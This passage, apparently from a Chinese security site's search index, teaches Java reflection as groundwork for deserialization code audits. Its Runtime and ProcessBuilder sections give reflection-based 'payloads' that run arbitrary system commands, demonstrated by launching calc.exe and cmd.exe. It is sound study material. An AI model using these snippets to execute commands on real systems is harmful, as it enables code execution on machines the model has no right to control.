c\u7c7b\u4e2d\u7684\u65b9\u6cd5\u3002","title":"\u53cd\u5c04\u7684\u57fa\u7840"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_7","text":"\u8981\u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u4fe1\u606f\u6216\u6267\u884c\u5176\u4e2d\u7684\u65b9\u6cd5\uff0c\u9996\u5148\u80af\u5b9a\u662f\u8981\u83b7\u53d6\u5230\u90a3\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61 \u65b9\u6cd5\u4e00:\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2aClass\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u7528\u4e8e\u63a5\u6536Class.forname(\u201c\u7c7b\u201d)\u8fd4\u56de\u7684\u7c7b\u5bf9\u8c61\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5fc5\u987b\u901a\u8fc7try..catch \u6765\u5904\u7406\u5176\u4e2dClassNotFoundException try{ Class clazz = Class.forname(\"java.lang.String\")\uff1b} catch(ClassNotFoundException e){} \u65b9\u6cd5\u4e8c:\u6211\u4eec\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\u51fa\u6765\uff0c\u7136\u540e\u901a\u8fc7 \u5bf9\u8c61.getClass()\u83b7\u5f97\u5176\u7c7b\u5bf9\u8c61 String a = new String; Class clazz = a.getclass(); \u65b9\u6cd5\u4e09:\u4f7f\u7528.class Class clazz = String.class; \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u83b7\u5f97\u4e00\u4e2a\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61\u4e86\u3002\u5f88\u7b80\u5355\u3002\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u4f7f\u7528getName()\u65b9\u6cd5\u83b7\u53d6\u5176\u7c7b\u540d\u3002 System.out.println(clazz.getName());","title":"\u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_8","text":"** \u83b7\u53d6\u5c5e\u6027\u5e76\u4fee\u6539 ** \u5bf9\u7c7b\u5bf9\u8c61\u4f7f\u7528 getFields() \u6216 getDeclaredFields() \u65b9\u6cd5\u5373\u53ef\u83b7\u5f97\u5c5e\u6027\u6570\u7ec4\uff0c\u533a\u522b\u5728\u4e8e\u524d\u8005\u53ea\u80fd\u83b7\u53d6\u516c\u6709\u5c5e\u6027\uff0c\u540e\u8005\u80fd\u83b7\u53d6\u79c1\u6709\u5c5e\u6027\u3002 \u7136\u540e\u904d\u5386\u5c5e\u6027\u6570\u7ec4\uff0c\u901a\u8fc7\u5bf9\u6bcf\u4e00\u9879\u6267\u884cgetName()\u83b7\u53d6\u5c5e\u6027\u540d\uff0cget(\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61)\u83b7\u5f97\u5c5e\u6027\u503c \u7136\u540e\u5bf9\u67d0\u4e00\u9879\u8fdb\u884c.set()\u5bf9\u5176\u8fdb\u884c\u4fee\u6539 \u8fd9\u91cc\u9700\u8981\u63d0\u7684\u662f\uff0c\u5982\u679c\u8981\u83b7\u5f97\u6216\u4fee\u6539\u79c1\u6709\u5c5e\u6027\u7684\u503c\u7684\u65f6\u5019\uff0c\u9700\u8981\u5bf9\u79c1\u6709\u5c5e\u6027\u4f7f\u7528setAccessible(true)\u6765\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee import java.lang.reflect.Field; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); abc test = new abc(); Field[] Fields = clazz.getDeclaredFields(); for(Field Field:Fields){ //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee System.out.print(Field.getName()); Object value = Field.get(new abc()); System.out.println(\":\" + value); Field.set(test,\"new\"); //\u4fee\u6539test\u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf } catch (Exception e){ } } System.out.println(test.a); } } class abc{ public String a =new String(\"tom and mary\"); private String b = new String(\"abcdefg\"); } \u8fd0\u884c\u7ed3\u679c \u53e6\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7getFiled(\u201c\u5c5e\u6027\u540d\u201d)\u6765\u83b7\u53d6\u7279\u5b9a\u5c5e\u6027\u7684Filed\u5bf9\u8c61\uff0c getDeclaredFields() \u540c\u7406 ** \u83b7\u53d6\u65b9\u6cd5\u5e76\u6267\u884c ** \u63a5\u4e0b\u6765\u662f\u83b7\u53d6\u65b9\u6cd5\u7684\u4e00\u4e9b\u4fe1\u606f \u6211\u4eec\u901a\u8fc7getMethod\u83b7\u53d6\u65b9\u6cd5\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7getName\u83b7\u53d6\u65b9\u6cd5\u540d\uff0cgetReturnType\u83b7\u53d6\u8fd4\u56de\u503c\u7c7b\u578b\uff0cgetParameterTypes\u83b7\u53d6\u4f20\u5165\u7684\u53c2\u6570\u7c7b\u578b import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); Method[] methods = clazz.getDeclaredMethods(); for(Method method:methods){ try{ System.out.print(method.getName()); System.out.print(\"|retrunType:\"+method.getReturnType()+\"|\"); Class[] ParameterTypes = method.getParameterTypes(); for(Class ParameterType:ParameterTypes){ System.out.print(\"ParamType:\"+ParameterType.getName()); } System.out.println(\"\"); } catch (Exception e){ } } } } class abc{ public int a =1; private String b = new String(\"abcdefg\"); public void func1(int input1){ System.out.print(input1); } private void func2(int input1){ System.out.print(input1); } } \u63a5\u4e0b\u6765\u662f\u5bf9method\u5bf9\u8c61\u6267\u884cinvoke\u65b9\u6cd5\u8c03\u7528\uff0c\u901a\u8fc7\u4f20\u5165\u53c2\u6570\uff0c\u6307\u5b9a\u5bf9\u8c61\uff0c\u5373\u53ef\u8c03\u7528\u8be5\u65b9\u6cd5\u3002\u6211\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u6dfb\u52a0\u4e86\u4fee\u6539 import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); Method[] methods = clazz.getDeclaredMethods(); for(Method method:methods){ try{ System.out.print(method.getName()); System.out.print(\"|retrunType:\"+method.getReturnType()+\"|\"); Class[] ParameterTypes = method.getParameterTypes(); for(Class ParameterType:ParameterTypes){ System.out.print(\"ParamType:\"+ParameterType.getName()); } System.out.println(\"\"); method.setAccessible(true); //\u6253\u5f00\u79c1\u6709\u8bbf\u95ee method.invoke(new abc(),2); //new \u8fd9\u91ccinvoke\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u4e4b\u540e\u7684\u53c2\u6570\u4ee3\u8868\u4f20\u5165\u65b9\u6cd5\u7684\u53c2\u6570 } catch (Exception e){ } } } } class abc{ public int a =1; private String b = new String(\"abcdefg\"); public void func1(int input1){ System.out.print(input1); } private void func2(int input1){ System.out.print(input1); } } ** \u83b7\u53d6\u6784\u9020\u65b9\u6cd5\u5e76\u6267\u884c ** \u83b7\u5f97\u6784\u9020\u65b9\u6cd5\uff0c\u4e3b\u8981\u662f\u901a\u8fc7 getConstructors()\u548cgetDeclaredConstructors() \uff0c\u540e\u8005\u80fd\u8bbf\u95ee\u79c1\u6709\u5bf9\u8c61,\u4e0b\u9762\u662f\u7528\u904d\u5386\u6cd5\u83b7\u5f97\u6240\u6709\u6784\u9020\u51fd\u6570\u4fe1\u606f import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ try{ Class clazz = Class.forName(\"abc\"); Constructor[] conArray = clazz.getDeclaredConstructors(); for (Constructor a:conArray){ a.setAccessible(true); System.out.println(a); } } catch(Exception e){ } } } class abc{ public abc(String name,int age){ System.out.println(\"\u59d3\u540d\uff1a\"+name+\"\u5e74\u9f84\uff1a\"+ age); } private abc(int age){ System.out.println(\"\u79c1\u6709\u7684\u6784\u9020\u65b9\u6cd5 \u5e74\u9f84\uff1a\"+ age); } } \u6211\u4eec\u521a\u624d\u63d0\u8fc7,getFiled()\u9644\u5e26\u53c2\u6570\u53ef\u4ee5\u6307\u5b9a\u8bbf\u95ee\u67d0\u4e00\u4e2a\u5c5e\u6027\uff0c\u540c\u7406\uff0cgetConstructor\u4e5f\u4e00\u6837\uff0c\u6211\u4eec\u60f3\u8981\u6267\u884c\u67d0\u4e00\u4e2a\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5f80\u5f80\u8fd9\u4e2a\u65b9\u6cd5\u66f4\u5b9e\u7528 \u8981\u6267\u884c\u4e00\u4e2a\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u90a3\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u8be5\u7c7b\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u6211\u4eec\u7528newInstance()\u65b9\u6cd5\u5b9e\u73b0 import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ try{ Class clazz = Class.forName(\"abc\"); Constructor test = clazz.getDeclaredConstructor(int.class); //\u6307\u5b9a\u53c2\u6570\uff0c\u5373\u53ef\u4ece\u591a\u4e2a\u91cd\u8f7d\u7684\u6784\u9020\u51fd\u6570\u6307\u5b9a\u5230\u67d0\u4e2a\u5177\u4f53\u7684\u6784\u9020\u51fd\u6570 test.setAccessible(true); test.newInstance(12); //\u79c1\u6709\u6784\u9020\u65b9\u6cd5\u53ea\u9700\u8c03\u7528\u4e00\u4e0bnewInstance\u4f20\u5165\u53c2\u6570\u5373\u53ef * *Constructor test2 = clazz.getDeclaredConstructor(String.class,int.class); test2.newInstance(\"tom\",15); //\u516c\u6709\u6784\u9020\u65b9\u6cd5\u4e5f\u4e00\u6837 } catch(Exception e){ } } } class abc{ public abc(String name,int age){ System.out.println(\"\u59d3\u540d\uff1a\"+name+\"\u5e74\u9f84\uff1a\"+ age); } private abc(int age){ System.out.println(\"\u79c1\u6709\u7684\u6784\u9020\u65b9\u6cd5 \u5e74\u9f84\uff1a\"+ age); } } \u6267\u884c\u7ed3\u679c \u540c\u65f6\u4e5f\u53ef\u4ee5\u7528 newinstance\u6765\u83b7\u53d6\u4e00\u4e2a\u5bf9\u8c61 \u7b2c\u4e00\u79cd\uff1a\u901a\u8fc7 Class \u5bf9\u8c61\u7684 newInstance() \u65b9\u6cd5\u3002 Class clz = Apple.class; Apple apple = (Apple)clz.newInstance(); \u7b2c\u4e8c\u79cd\uff1a\u901a\u8fc7 Constructor \u5bf9\u8c61\u7684 newInstance() \u65b9\u6cd5 Class clz = Apple.class; Constructor constructor = clz.getConstructor(); Apple apple = (Apple)constructor.newInstance(); \u901a\u8fc7 Constructor \u5bf9\u8c61\u521b\u5efa\u7c7b\u5bf9\u8c61\u53ef\u4ee5\u6839\u636e\u4f20\u5165newinstance\u7684\u53c2\u6570\u9009\u62e9\u7279\u5b9a\u6784\u9020\u65b9\u6cd5\uff0c\u800c\u901a\u8fc7 Class \u5bf9\u8c61\u5219\u53ea\u80fd\u4f7f\u7528\u9ed8\u8ba4\u7684\u65e0\u53c2\u6570\u6784\u9020\u65b9\u6cd5\u3002\u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u8c03\u7528\u4e86\u4e00\u4e2a\u6709\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5\u8fdb\u884c\u4e86\u7c7b\u5bf9\u8c61\u7684\u521d\u59cb\u5316\u3002","title":"\u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u7684\u6240\u6709\u6210\u5458"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_9","text":"","title":"\u53cd\u5c04\u7684\u8fdb\u9636\u4e0e\u5b89\u5168"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#classforname","text":"Class.forName(\u201c\u2026\u201d) \u5e38\u88ab\u6211\u4eec\u62ff\u6765\u83b7\u5f97\u7c7b\u5bf9\u8c61\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0cClass.forname\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u53ea\u4e0d\u8fc7\u6211\u4eec\u9ed8\u8ba4\u8f93\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u7c7b\u540d\u5c31\u80fd\u5b8c\u6210\u5de5\u4f5c\u4e86\u3002 \u8fd9\u662fClass.fornName\u51fd\u6570\u539f\u578b public static Class<?> forName(String name, boolean initialize, ClassLoader loader) Class.forName(className) // \u7b49\u4e8e Class.forName(className, true, currentLoader) \u8fd9\u91cc\u6211\u4eec\u770b\u89c1\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6307\u5b9a\u7c7b\u540d\u5c31\u4e0d\u591a\u8bb2\u4e86\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u51b3\u5b9a\u7c7b\u662f\u5426\u521d\u59cb\u5316\uff08\u8fd9\u4e2a\u7a0d\u540e\u4f1a\u8be6\u7ec6\u9610\u660e\uff09\uff0c\u7b2c\u4e09\u4e2a\u662fClassLoader\u7c7b\u52a0\u8f7d\u5668\uff08\u544a\u8bc9JVM\u5982\u4f55\u52a0\u8f7d\u8fd9\u4e2a\u7c7b\u8fd9\u91cc\u4e0d\u5c55\u5f00\u8bf4\uff09 \u5173\u4e8e\u4e00\u4e2a\u7c7b\u7684\u521d\u59cb\u5316\uff0c\u6709\u4e09\u79cd\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0:\u6784\u9020\u65b9\u6cd5\uff0c\u7a7a\u5757\u548cstatic\u5757\uff0c\u5c31\u50cf\u8fd9\u6837 public class TrainPrint { { System.out.printf(\"Empty block initial %s\\n\", this.getClass()); } static { System.out.printf(\"Static initial %s\\n\", TrainPrint.class); } public TrainPrint() { System.out.printf(\"Initial %s\\n\", this.getClass()); } } \u90a3\u4e48\u6267\u884c\u987a\u5e8f\u662f\u5982\u4f55\u5462\uff0c\u5728\u5f15\u5165\u7236\u7c7b\u7684\u60c5\u51b5\u4e0b\u53c8\u662f\u5982\u4f55\u5462\uff1f\u6211\u4eec\u5199\u4e2ademo\u770b\u770b import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ abc a = new abc(); } } class b{ { System.out.println(\"b\u7a7a\u5757\u5df2\u6267\u884c\"); } static{ System.out.println(\" b static\u5757\u5df2\u6267\u884c\"); } public b(){ System.out.println(\"b\u7c7b\u6784\u9020\u65b9\u6cd5\u5df2\u6267\u884c\"); } } class abc extends b{ { System.out.println(\"a\u7a7a\u5757\u5df2\u6267\u884c\"); } static{ System.out.println(\" a static\u5757\u5df2\u6267\u884c\"); } public abc() { System.out.println(\"a\u521d\u59cb\u5316\u65b9\u6cd5\u5df2\u6267\u884c\"); } } \u6211\u4eec\u53ef\u4ee5\u6e05\u6670\u7684\u770b\u5230\u6267\u884c\u987a\u5e8f\uff0c\u5bf9\u7ee7\u627f\u7c7b\u6765\u8bf4\uff0c 1.\u4f1a\u5148\u6267\u884c\u7236\u7c7bstatic\u5757 2.\u6267\u884c\u81ea\u5df1\u7684static\u5757 3.\u6267\u884c\u7236\u7c7b\u7a7a\u5feb 4.\u6267\u884c\u7236\u7c7b\u6784\u9020\u65b9\u6cd5 5.\u6267\u884c\u81ea\u5df1\u7a7a\u5feb 6.\u6267\u884c\u81ea\u5df1\u6784\u9020\u65b9\u6cd5 \u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u6765\u8bf4\uff0c\u6267\u884c\u987a\u5e8f\u5219\u662f 1.\u6267\u884cstatic\u5757 2.\u6267\u884c\u7a7a\u5feb 3.\u6267\u884c\u6784\u9020\u65b9\u6cd5 \u90a3\u4e48\u5bf9\u4e8eClass.forName\u6307\u5b9a\u7684\u662f\u5426\u8fdb\u884c\u7c7b\u521d\u59cb\u5316\u53c2\u6570\uff0c\u6307\u7684\u662f\u54ea\u4e2a\u90e8\u5206\uff1fstatic\u5757\uff0c\u7a7a\u5757\u8fd8\u662f\u6784\u9020\u65b9\u6cd5?\u7b54\u6848\u662f\u53ea\u4f1a\u6267\u884cstatic\u5757\u91cc\u7684\uff0c\u4e14\u4f1a\u4f18\u5148\u6267\u884c\u7236\u7c7b\u7684static\u5757\u3002 \u6211\u4eec\u628a\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u4e3b\u51fd\u6570\u66ff\u6362\u4e3a try { Class clazz = Class.forName(\"abc\"); } catch (Exception e){} \u6267\u884c\u4e00\u4e0b\uff0c\u770b\u7ed3\u679c\u3002\u53d1\u73b0\u53ea\u6267\u884c\u4e86static\u5757 \u4e5f\u5c31\u662f\u8bf4\uff0cClass.forName()\u4f1a\u9ed8\u8ba4\u6267\u884c\u7c7b\u7684static\u4ee3\u7801\u5757\uff0c\u662f\u4e2a\u6bd4\u8f83\u5371\u9669\u7684\u4fe1\u53f7\u3002 \u53e6\u5916\u4e00\u63d0\uff0cxxx.class.newinstance() \u4e5f\u4f1a\u81ea\u52a8\u8c03\u7528\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cstatic\u5757\u548c\u7a7a\u5757\uff0c\u65e0\u8bba\u662f\u6709\u53c2\u6570\u8fd8\u662f\u65e0\u53c2\u6570\uff0cnew\u5173\u952e\u5b57\u548cnewinstance\u5728\u8fd9\u4e00\u70b9\u4e0a\u662f\u4e00\u6837\u7684\u3002","title":"Class.forName \u5b9e\u8d28\u4e0e\u7c7b\u521d\u59cb\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#runtime","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u8c03\u7528Runtime\u7c7b\u6765\u6267\u884c\u547d\u4ee4\u65f6\u7684\u6307\u5b9a\u662f\u8fd9\u6837\u7684 Runtime.getRuntime().exe() \u6211\u4eec\u5230\u6e90\u7801\u91cc\u5206\u6790\u8fd9\u6bb5\u4ee3\u7801 \u53ef\u89c1\uff0c\u5f53\u6211\u4eec\u5bf9Runtime\u7c7b\u6267\u884cgetRuntime()\u65f6\u4f1a\u5f97\u5230\u4e00\u4e2aRuntime\u5bf9\u8c61\uff0c\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u7684exec\u65b9\u6cd5\u4e86 \u540c\u65f6\uff0cRuntime() \u88abprivate\u4fee\u9970\u7b26\u4fee\u9970\u4e86\uff0c\u8fd9\u8bf4\u660e\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7Runtime a = new Runtime()\u6765\u5b9e\u73b0\u4e00\u4e2aRuntime\u7684\u5bf9\u8c61\u3002 \u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u6b63\u5e38\u5730\u4f7f\u7528runtime\u6765\u6267\u884c\u547d\u4ee4\u53ea\u80fd\u4f9d\u9760\u4ee5\u4e0a\u4ee3\u7801\u3002 \u90a3\u4e48\u6211\u4eec\u8981\u662f\u60f3\u8981\u4f9d\u9760\u53cd\u5c04\u6765\u5199\u4e00\u4e2aRuntime\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684payload\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u5199\u5462\uff1f \u5148\u6765\u4e00\u4e2a\u9519\u8bef\u793a\u8303\uff0c\u5f53\u6211\u4eec\u7528\u5e38\u89c4\u7684\u601d\u8def\u53bb\u5b9e\u73b0\u65f6\u3002\u6211\u4eec\u76f4\u63a5\u8c03\u7528Runtime\u7c7b\u91cc\u7684exec\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7newInstance\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2aRuntime\u5bf9\u8c61 Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getMethod(\"exec\", String.class); method.setAccessible(true); method.invoke(clazz.newInstance(),\"calc.exe\"); \u6700\u7ec8\u7ed3\u679c\u5219\u662f\u62a5\u9519\uff1aclass test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u201cprivate\u201d \u770b\u6765\u901a\u8fc7\u53cd\u5c04\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528exec\u65b9\u6cd5\uff0c\u6216\u8005\u8bf4\u4e0d\u80fd\u5b9e\u4f8b\u5316Runtime\u5bf9\u8c61\u3002 \u90a3\u4e48\u6b63\u786e\u601d\u8def\u8be5\u662f\u4ec0\u4e48\u5462\uff1f\u5e94\u8be5\u662f\u5148\u8c03\u7528getRuntime\u83b7\u5f97Runtime\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u8c03\u7528exec\u65b9\u6cd5 Class clazz = Class.forName(\"java.lang.Runtime\"); Method MgetRuntime = clazz.getMethod(\"getRuntime\"); Object runtime = MgetRuntime.invoke(clazz); //\u5bf9\u7c7b\u5bf9\u8c61\u4f7f\u7528getRuntime(),\u5176\u5b9e\u5c31\u76f8\u5f53\u4e8eRuntime.getRuntime()\u3002\u8fd9\u79cd\u65b9\u5f0f\u4ec5\u9650static\u65b9\u6cd5 Method Mexec = clazz.getMethod(\"exec\", String.class); Mexec.invoke(runtime,\"calc.exe\"); \u6700\u7ec8\u5f39\u51fa\u8ba1\u7b97\u5668\u3002","title":"Runtime\u6267\u884c\u547d\u4ee4\u89e3\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#processbuilder","text":"\u9664\u4e86Runtime\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528ProcessBuilder\u7c7b\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5b83\u7684\u6b63\u5e38\u60c5\u51b5\u4f7f\u7528\u5982\u4e0b. ProcessBuilder pb = new ProcessBuilder(\"calc.exe\"); pb.start(); \u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0bProcessBuilder\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u6709\u5f88\u591a\u4e2a\u91cd\u8f7d\uff0c\u6211\u4eec\u5206\u6790\u4e00\u4e2a\u5427\u3002 \u53ef\u89c1\uff0cProcessBuilder\u7684\u6784\u9020\u65b9\u6cd5\u628a\u4f20\u5165\u53c2\u6570\u4fdd\u5b58\u5230\u4e86command\u5c5e\u6027\u91cc\uff0c\u7136\u540ecommad\u4f1a\u88ab\u4ee5\u7cfb\u7edf\u547d\u4ee4\u8c03\u7528\uff08\u8fd9\u90e8\u5206\u4ee3\u7801\u5c31\u4e0d\u8d34\u51fa\u6765\u4e86\uff09\u3002 \u90a3\u4e48\u4ee5\u53cd\u5c04\u7684\u5f62\u5f0f\u8be5\u5982\u4f55\u5b9e\u73b0\u5462\u3002 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); Method start = clazz.getMethod(\"start\"); start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"cmd.exe\")));","title":"ProcessBuilder\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5c04\u5b9e\u73b0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#servlet","text":"","title":"Servlet"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#servlet_1","text":"** 1 **.\u8c03\u7528init()\u65b9\u6cd5\u8fdb\u884c\u521d\u59cb\u5316 init()\u65b9\u6cd5\u5728\u7b2c\u4e00\u6b21\u521b\u5efaservlet\u65f6\u88ab\u8c03\u7528\uff0c\u7528\u4e8e\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u3002 public void init() throws ServletException{...code...} ** 2 **.\u8c03\u7528service()\u65b9\u6cd5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42 web\u670d\u52a1\u5668\uff0c\u5373servlet\u5bb9\u5668\u8c03\u7528service()\u65b9\u6cd5\u5904\u7406\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u8fd4\u56de\u54cd\u5e94\u3002\u540c\u65f6\u6839\u636e\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u7c7b\u578b\uff08Get\uff0cPost\uff0cdelete\u7b49\uff09\uff0c\u505a\u51fa\u4e0d\u540c\u7684\u884c\u4e3a\uff0c\u8fd9\u4e9b\u884c\u4e3a\u662f\u7531service\u65b9\u6cd5\u62bd\u8c61\u51fa\u7684\u5176\u4ed6\u65b9\u6cd5\uff08doGet\uff0cdoPost\u7b49\uff09\u3002 \u6240\u4ee5\u8fd9\u91cc\u8bf4\u7684\u8c03\u7528service()\u65b9\u6cd5\u4e5f\u5c31\u662f\u7b49\u540c\u4e8e\u8c03\u7528doGet\uff0cdoPost\u7b49\u65b9\u6cd5\u3002 doPost,doDelete\u7b49\u65b9\u6cd5\u7684\u5b9a\u4e49\u5f62\u540c\u4e8e\u4e0b public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException{...code...} ** 3 **.\u8c03\u7528distroy()\u5728Servlet\u9500\u6bc1\u524d\u5b8c\u6210\u6e05\u7406\u6d3b\u52a8 distrtoy()\u51fd\u6570\u53ea\u8c03\u7528\u4e00\u6b21\uff0c\u5728Servlet\u88ab\u9500\u6bc1\u524d\u5b8c\u6210\u540e\u53f0\u7ebf\u7a0b\u505c\u6b62\uff0c\u6570\u636e\u5e93\u94fe\u63a5\u5173\u95ed\u7b49\u4e00\u7cfb\u5217\u6e05\u7406\u5de5\u4f5c\u3002 public void destroy() { // \u7ec8\u6b62\u5316\u4ee3\u7801... 